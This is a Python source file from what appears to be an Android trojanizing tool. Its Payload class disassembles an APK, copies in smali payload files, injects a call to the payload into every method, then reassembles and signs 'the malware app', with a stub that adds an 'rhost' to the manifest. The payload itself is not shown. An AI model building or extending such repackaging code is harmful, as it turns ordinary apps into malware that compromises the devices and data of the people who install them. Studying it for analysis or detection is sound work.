#    Copyright (C) 2015 Alexandre Teyar

# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at

# http://www.apache.org/licenses/LICENSE-2.0

# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
#    limitations under the License.

import fnmatch
import logging
import os
import sys

from tqdm import tqdm
from metadata import metadata
from reverse_engineer import reverse_engineer
from utils import config, file_operation, process_info


class Payload(object):
    def __init__(self, args):
        self.args = args
        self.payload_name = args.payload_name
        self.app_name = os.path.basename(args.app.name)
        self.app_path = os.path.abspath(args.app.name)
        self.destination = os.path.join(
            config.TMP_FOLDER,
            os.path.splitext(self.app_name)[0],
            args.destination
        )
        self.keywords = args.keywords.split(',')

    def run(self):
        logging.info("disassembling {}...".format(self.app_path))
        logging.warning("this operation might take some time")
        reverse_engineer.disassemble(self)

        logging.info(
            "exporting the {} smali files into the malware source code".format(
                self.payload_name
            )
        )

        self.export_payload()
        self.set_payload_settings()

        logging.info(
            "injecting the call to the {} "
            "main method within all methods in {}...".format(
                self.payload_name, self.destination
            )
        )

        if os.path.exists(self.destination):
            if os.path.isdir(self.destination):
                dir_metadata = metadata.generate_dir_metadata(self.destination)
                self.inject_in_dir(dir_metadata)

                methods, edited_method, log_path = process_info.get_dir_info(
                    self, dir_metadata
                )

                logging.info(
                    "the {} main method call has been injected "
                    "into {}/{} methods".format(
                        self.payload_name,
                        edited_method,
                        methods
                    )
                )

                logging.info(
                    "log file created at {}".format(log_path)
                )

            elif os.path.isfile(self.destination):
                file_metadata = metadata.generate_file_metadata(
                    self.destination
                )
                self.inject(self.destination, file_metadata)

                methods, edited_method, log_path = process_info.get_file_info(
                    self, file_metadata
                )

                logging.info(
                    "the {} main method call has been injected "
                    "into {}/{} methods".format(
                        self.payload_name,
                        edited_method,
                        methods
                    )
                )

                logging.info(
                    "log file created at {}".format(log_path)
                )

        else:
            logging.error(
                "{} does not exist, chose a valid destination...".format(
                    self.destination
                )
            )
            sys.exit(1)

        logging.info("reassembling the malware app...")
        logging.warning("this operation might take some time")
        reverse_engineer.reassemble(self)

        logging.info("signing the malware app...")
        reverse_engineer.sign(self)

    def inject(self):
        pass

    def inject_in_dir(self, dir_metadata):
        """
        Recursively inject the payload within the files contained in the
        destination folder.
        """
        for root, dirs, files in tqdm(
            list(os.walk(self.destination)),
            unit='dir',
            unit_scale=True,
            dynamic_ncols=True
        ):
            for file in fnmatch.filter(files, "*.smali"):
                file_path = os.path.join(root, file)

                # Skip the payload directory
                if (self.payload_name in file_path):
                    continue

                else:
                    file_metadata = dir_metadata[file_path]
                    self.inject(file_path, file_metadata)

    # TODO: Got really messy - improve this if possible
    def export_payload(self):
        """
        Copy the smali payload files into the app android folder.
        """
        payload_dest_folder = os.path.join(
            config.TMP_FOLDER, os.path.splitext(self.app_name)[0], "android"
        )

        file_operation.copy(
            os.path.join(config.PAYLOAD_FOLDER, self.payload_name),
            os.path.join(payload_dest_folder, self.payload_name)
        )

        # Copy the minimum 'android' libraries needed
        # to run the payload
        lib_v4 = os.walk(
            os.path.join(config.PAYLOAD_FOLDER, "support", "v4")
        )

        for root, dirs, files in lib_v4:
            lib_v4_dest_folder = root.replace(
                config.PAYLOAD_FOLDER,
                os.path.join(
                    config.TMP_FOLDER,
                    os.path.splitext(self.app_name)[0],
                    "android"
                )
            )

            for file in files:
                if not os.path.exists(
                    os.path.join(lib_v4_dest_folder, file)
                ):
                    file_operation.copy(
                        os.path.join(root, file),
                        os.path.join(lib_v4_dest_folder, file)
                    )

    def set_payload_settings(self, payload_path):
        """
        Add the rhost and ppg to the AndroidManifest.
        """
        pass
